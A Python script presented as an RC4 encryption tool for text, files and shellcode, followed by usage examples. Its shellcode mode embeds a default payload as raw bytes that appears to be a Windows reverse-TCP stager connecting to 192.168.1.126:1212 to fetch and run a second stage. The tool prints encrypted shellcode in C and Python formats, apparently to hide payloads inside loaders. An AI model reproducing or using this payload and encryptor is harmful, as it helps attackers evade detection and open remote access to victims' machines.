import sys
import os
import base64
import argparse
from getpass import getpass

# ===== Advanced RC4 Implementation =====

class AdvancedRC4:
    def __init__(self, key):
        """Initialize RC4 with a key"""
        if isinstance(key, str):
            key = key.encode('utf-8')
        self.key = key
    
    def swap(self, s, i, j):
        """Swap two elements in the state array"""
        s[i], s[j] = s[j], s[i]
    
    def KSA(self):
        """Key Scheduling Algorithm"""
        s = list(range(256))
        j = 0
        for i in range(256):
            j = (j + s[i] + self.key[i % len(self.key)]) % 256
            self.swap(s, i, j)
        return s
    
    def PRGA(self, s, length):
        """Pseudo-Random Generation Algorithm"""
        i = 0
        j = 0
        keystream = []
        for _ in range(length):
            i = (i + 1) % 256
            j = (j + s[i]) % 256
            self.swap(s, i, j)
            keystream.append(s[(s[i] + s[j]) % 256])
        return keystream
    
    def encrypt_decrypt(self, data):
        """RC4 encryption/decryption (same operation)"""
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        s = self.KSA()
        keystream = self.PRGA(s, len(data))
        
        # XOR each byte of data with keystream
        result = bytearray()
        for i in range(len(data)):
            result.append(data[i] ^ keystream[i])
        
        return bytes(result)
    
    def encrypt_file(self, input_file, output_file):
        """Encrypt a file"""
        try:
            with open(input_file, 'rb') as f:
                data = f.read()
            
            encrypted = self.encrypt_decrypt(data)
            
            with open(output_file, 'wb') as f:
                f.write(encrypted)
            
            return True
        except Exception as e:
            print(f"Error encrypting file: {e}")
            return False
    
    def decrypt_file(self, input_file, output_file):
        """Decrypt a file (same as encrypt)"""
        return self.encrypt_file(input_file, output_file)

# ===== Utility Functions =====

def bytes_to_c_format(data, bytes_per_line=16):
    """Convert bytes to C-style hex string format"""
    output = '"'
    for i, byte in enumerate(data):
        output += f"\\x{byte:02x}"
        if (i + 1) % bytes_per_line == 0 and i + 1 != len(data):
            output += '"\n"'
    output += '"'
    return output

def bytes_to_python_format(data):
    """Convert bytes to Python list format"""
    output = "bytes([\n    "
    for i, byte in enumerate(data):
        output += f"0x{byte:02x}"
        if i != len(data) - 1:
            output += ", "
        if (i + 1) % 12 == 0 and i != len(data) - 1:
            output += "\n    "
    output += "\n])"
    return output

def generate_random_key(length=16):
    """Generate a random key"""
    return os.urandom(length)

def parse_shellcode_string(shellcode_str):
    """Parse shellcode from string format like \\x41\\x42\\x43"""
    if shellcode_str.startswith('"') and shellcode_str.endswith('"'):
        shellcode_str = shellcode_str[1:-1]
    
    hex_string = shellcode_str.replace('\\x', '').replace('"', '').replace("'", "").replace(' ', '').replace('\n', '')
    try:
        return bytes.fromhex(hex_string)
    except ValueError as e:
        raise ValueError(f"Invalid shellcode format: {e}")

# ===== Main Application =====

def main():
    parser = argparse.ArgumentParser(description='Advanced RC4 Encryption Tool')
    parser.add_argument('-m', '--mode', choices=['encrypt', 'decrypt', 'auto'], 
                       default='auto', help='Operation mode')
    parser.add_argument('-t', '--type', choices=['text', 'file', 'shellcode'], 
                       default='text', help='Input type')
    parser.add_argument('-i', '--input', help='Input text or file path')
    parser.add_argument('-o', '--output', help='Output file path')
    parser.add_argument('-k', '--key', help='Encryption key')
    parser.add_argument('-f', '--key-file', help='File containing encryption key')
    parser.add_argument('--generate-key', action='store_true', help='Generate random key')
    parser.add_argument('--output-format', choices=['raw', 'hex', 'base64', 'c', 'python'], 
                       default='hex', help='Output format')
    
    args = parser.parse_args()
    
    # Handle key generation
    if args.generate_key:
        key = generate_random_key(32)
        print(f"[+] Generated Random Key (hex): {key.hex()}")
        print(f"[+] Generated Random Key (base64): {base64.b64encode(key).decode()}")
        return
    
    # Get encryption key
    key = None
    if args.key:
        key = args.key
    elif args.key_file:
        try:
            with open(args.key_file, 'r') as f:
                key = f.read().strip()
        except FileNotFoundError:
            print(f"[-] Key file not found: {args.key_file}")
            return
    else:
        key = getpass("[?] Enter encryption key: ")
        if not key:
            print("[-] No key provided!")
            return
    
    # Initialize RC4
    rc4 = AdvancedRC4(key)
    
    # Process based on input type
    if args.type == 'text':
        process_text(rc4, args)
    elif args.type == 'file':
        process_file(rc4, args)
    elif args.type == 'shellcode':
        process_shellcode(rc4, args)

def process_text(rc4, args):
    """Process text input"""
    if not args.input:
        args.input = input("[?] Enter text to process: ")
    
    # Determine mode if auto
    mode = args.mode
    if mode == 'auto':
        # Try to detect if it's hex encoded
        if args.input.startswith('\\x') or all(c in '0123456789abcdefABCDEF\\x ' for c in args.input):
            mode = 'decrypt'
        else:
            mode = 'encrypt'
    
    if mode == 'encrypt':
        result = rc4.encrypt_decrypt(args.input)
        print(f"\n[+] Encryption completed!")
        print_output(result, args.output_format, args.output)
    else:
        # Handle hex string input like "\x41\x42\x43"
        if args.input.startswith('\\x'):
            hex_string = args.input.replace('\\x', '').replace('"', '').replace("'", "")
            try:
                encrypted_data = bytes.fromhex(hex_string)
            except ValueError:
                print("[-] Invalid hex format!")
                return
        else:
            encrypted_data = args.input.encode('utf-8')
        
        result = rc4.encrypt_decrypt(encrypted_data)
        print(f"\n[+] Decryption completed!")
        try:
            decoded_result = result.decode('utf-8')
            print(f"[*] Decrypted text: {decoded_result}")
            if args.output:
                with open(args.output, 'w', encoding='utf-8') as f:
                    f.write(decoded_result)
        except UnicodeDecodeError:
            print("[!] Result contains non-UTF8 bytes, showing in hex format:")
            print_output(result, 'hex', args.output)

def process_file(rc4, args):
    """Process file input"""
    if not args.input:
        args.input = input("[?] Enter input file path: ")
    
    if not args.output:
        if args.mode == 'encrypt':
            args.output = args.input + '.encrypted'
        else:
            if args.input.endswith('.encrypted'):
                args.output = args.input[:-10]
            else:
                args.output = args.input + '.decrypted'
    
    mode = args.mode
    if mode == 'auto':
        mode = 'decrypt' if args.input.endswith('.encrypted') else 'encrypt'
    
    if mode == 'encrypt':
        if rc4.encrypt_file(args.input, args.output):
            print(f"[+] File encrypted successfully: {args.output}")
        else:
            print("[-] File encryption failed!")
    else:
        if rc4.decrypt_file(args.input, args.output):
            print(f"[+] File decrypted successfully: {args.output}")
        else:
            print("[-] File decryption failed!")

def process_shellcode(rc4, args):
    """Process shellcode"""
    shellcode = None
    
    if not args.input:
        # Use default shellcode if none provided (corrected bytes format)
        shellcode = bytes([
            0xfc, 0xe8, 0x8f, 0x00, 0x00, 0x00, 0x60, 0x89, 0xe5, 0x31, 0xd2, 0x64, 0x8b, 0x52,
            0x30, 0x8b, 0x52, 0x0c, 0x8b, 0x52, 0x14, 0x0f, 0xb7, 0x4a, 0x26, 0x31, 0xff, 0x8b,
            0x72, 0x28, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0xc1, 0xcf, 0x0d,
            0x01, 0xc7, 0x49, 0x75, 0xef, 0x52, 0x57, 0x8b, 0x52, 0x10, 0x8b, 0x42, 0x3c, 0x01,
            0xd0, 0x8b, 0x40, 0x78, 0x85, 0xc0, 0x74, 0x4c, 0x01, 0xd0, 0x8b, 0x48, 0x18, 0x50,
            0x8b, 0x58, 0x20, 0x01, 0xd3, 0x85, 0xc9, 0x74, 0x3c, 0x49, 0x8b, 0x34, 0x8b, 0x01,
            0xd6, 0x31, 0xff, 0x31, 0xc0, 0xac, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0x38, 0xe0, 0x75,
            0xf4, 0x03, 0x7d, 0xf8, 0x3b, 0x7d, 0x24, 0x75, 0xe0, 0x58, 0x8b, 0x58, 0x24, 0x01,
            0xd3, 0x66, 0x8b, 0x0c, 0x4b, 0x8b, 0x58, 0x1c, 0x01, 0xd3, 0x8b, 0x04, 0x8b, 0x01,
            0xd0, 0x89, 0x44, 0x24, 0x24, 0x5b, 0x5b, 0x61, 0x59, 0x5a, 0x51, 0xff, 0xe0, 0x58,
            0x5f, 0x5a, 0x8b, 0x12, 0xe9, 0x80, 0xff, 0xff, 0xff, 0x5d, 0x68, 0x33, 0x32, 0x00,
            0x00, 0x68, 0x77, 0x73, 0x32, 0x5f, 0x54, 0x68, 0x4c, 0x77, 0x26, 0x07, 0x89, 0xe8,
            0xff, 0xd0, 0xb8, 0x90, 0x01, 0x00, 0x00, 0x29, 0xc4, 0x54, 0x50, 0x68, 0x29, 0x80,
            0x6b, 0x00, 0xff, 0xd5, 0x6a, 0x0a, 0x68, 0xc0, 0xa8, 0x01, 0x7e, 0x68, 0x02, 0x00,
            0x04, 0xbc, 0x89, 0xe6, 0x50, 0x50, 0x50, 0x50, 0x40, 0x50, 0x40, 0x50, 0x68, 0xea,
            0x0f, 0xdf, 0xe0, 0xff, 0xd5, 0x97, 0x6a, 0x10, 0x56, 0x57, 0x68, 0x99, 0xa5, 0x74,
            0x61, 0xff, 0xd5, 0x85, 0xc0, 0x74, 0x0a, 0xff, 0x4e, 0x08, 0x75, 0xec, 0xe8, 0x67,
            0x00, 0x00, 0x00, 0x6a, 0x00, 0x6a, 0x04, 0x56, 0x57, 0x68, 0x02, 0xd9, 0xc8, 0x5f,
            0xff, 0xd5, 0x83, 0xf8, 0x00, 0x7e, 0x36, 0x8b, 0x36, 0x6a, 0x40, 0x68, 0x00, 0x10,
            0x00, 0x00, 0x56, 0x6a, 0x00, 0x68, 0x58, 0xa4, 0x53, 0xe5, 0xff, 0xd5, 0x93, 0x53,
            0x6a, 0x00, 0x56, 0x53, 0x57, 0x68, 0x02, 0xd9, 0xc8, 0x5f, 0xff, 0xd5, 0x83, 0xf8,
            0x00, 0x7d, 0x28, 0x58, 0x68, 0x00, 0x40, 0x00, 0x00, 0x6a, 0x00, 0x50, 0x68, 0x0b,
            0x2f, 0x0f, 0x30, 0xff, 0xd5, 0x57, 0x68, 0x75, 0x6e, 0x4d, 0x61, 0xff, 0xd5, 0x5e,
            0x5e, 0xff, 0x0c, 0x24, 0x0f, 0x85, 0x70, 0xff, 0xff, 0xff, 0xe9, 0x9b, 0xff, 0xff,
            0xff, 0x01, 0xc3, 0x29, 0xc6, 0x75, 0xc1, 0xc3, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x6a,
            0x00, 0x53, 0xff, 0xd5
        ])
        print(f"[*] Using default shellcode ({len(shellcode)} bytes)")
    else:
        # Parse shellcode from input
        if args.input.startswith('\\x') or os.path.isfile(args.input):
            if args.input.startswith('\\x'):
                try:
                    shellcode = parse_shellcode_string(args.input)
                except ValueError as e:
                    print(f"[-] {e}")
                    return
            else:
                try:
                    with open(args.input, 'rb') as f:
                        shellcode = f.read()
                except FileNotFoundError:
                    print(f"[-] File not found: {args.input}")
                    return
        else:
            print("[-] Invalid shellcode input. Use \\x format or file path.")
            return
    
    mode = args.mode
    if mode == 'auto':
        mode = 'encrypt'
    
    if mode == 'encrypt':
        encrypted = rc4.encrypt_decrypt(shellcode)
        print("\n[+] Shellcode encrypted!")
        print(f"[*] Original length: {len(shellcode)} bytes")
        print(f"[*] Encrypted length: {len(encrypted)} bytes")
        
        print("\n[*] Encrypted shellcode (C format):")
        print(bytes_to_c_format(encrypted))
        
        print("\n[*] Encrypted shellcode (Python format):")
        print(bytes_to_python_format(encrypted))
        
        if args.output:
            with open(args.output, 'wb') as f:
                f.write(encrypted)
            print(f"\n[+] Encrypted shellcode saved to: {args.output}")
    else:
        decrypted = rc4.encrypt_decrypt(shellcode)
        print("\n[+] Shellcode decrypted!")
        
        # Verify by checking if it looks like executable code
        if decrypted[:2] in [b'\x4d\x5a', b'\x7fELF', b'\xfc\xe8']:  # Common magic bytes
            print("[+] Decrypted data appears to be valid executable code")
        
        print("\n[*] Decrypted shellcode:")
        print(bytes_to_c_format(decrypted))
        
        if args.output:
            with open(args.output, 'wb') as f:
                f.write(decrypted)
            print(f"\n[+] Decrypted shellcode saved to: {args.output}")

def print_output(data, format_type, output_file=None):
    """Print output in specified format"""
    if format_type == 'raw':
        output = data
    elif format_type == 'hex':
        output = data.hex()
    elif format_type == 'base64':
        output = base64.b64encode(data).decode()
    elif format_type == 'c':
        output = bytes_to_c_format(data)
    elif format_type == 'python':
        output = bytes_to_python_format(data)
    else:
        output = data.hex()
    
    print(f"\n[*] Output ({format_type}):")
    print(output)
    
    if output_file:
        if format_type in ['raw', 'hex', 'base64']:
            mode = 'wb' if format_type == 'raw' else 'w'
            with open(output_file, mode) as f:
                f.write(output if format_type != 'raw' else data)
        else:
            with open(output_file, 'w') as f:
                f.write(output)
        print(f"[+] Output saved to: {output_file}")

if __name__ == "__main__":
    # If no arguments, run interactive mode
    if len(sys.argv) == 1:
        print("Advanced RC4 Encryption Tool")
        print("=" * 30)
        
        choice = input("Choose mode:\n1. Text encryption/decryption\n2. File encryption/decryption\n3. Shellcode encryption\n4. Generate random key\n> ")
        
        if choice == '1':
            sys.argv = [sys.argv[0], '-t', 'text']
        elif choice == '2':
            sys.argv = [sys.argv[0], '-t', 'file']
        elif choice == '3':
            sys.argv = [sys.argv[0], '-t', 'shellcode']
        elif choice == '4':
            sys.argv = [sys.argv[0], '--generate-key']
        else:
            print("Invalid choice!")
            sys.exit(1)
    
    main()




"""
Text Encrypt and Decrypt

python3 rc4.py -m encrypt -t text -k "yourpassword" -i "yourtext"

python3 rc4.py -m decrypt -t text -l "yourpassword" -i "encrypt code"
python3 rc4.py -m decrypt -t text -k "yourpassword" -i "\x12\xab\xcd\x33..."



File Encrypt and Decrypt
python3 rc4.py -m encrypt -t file -k "yourpassword" -i secret.txt -o secret.txt.encrypted

python3 rc4.py -m decrypt -t file -k "yourpassword" -i secret.txt.encrypted -o secret.decrypted.txt



Generate random key
python3 rc4.py --generate-key


Shellcode
python3 rc4.py -t shellcode -m encrypt -k "yourpassword"


Encrypt shellcode from file
python3 rc4.py -t shellcode -m encrypt -k "yourpassword" -i my_shellcode.bin

Decrypt shellcode
python3 rc4.py -t shellcode -m decrypt -k "yourpassword" -i encrypted_shellcode.bin


change output format
hex

base64

C-style (\x41\x42)

Python bytes

raw bytes

Example:

python3 rc4.py -m encrypt -t text -k "pass" -i "hello" --output-format base64
"""
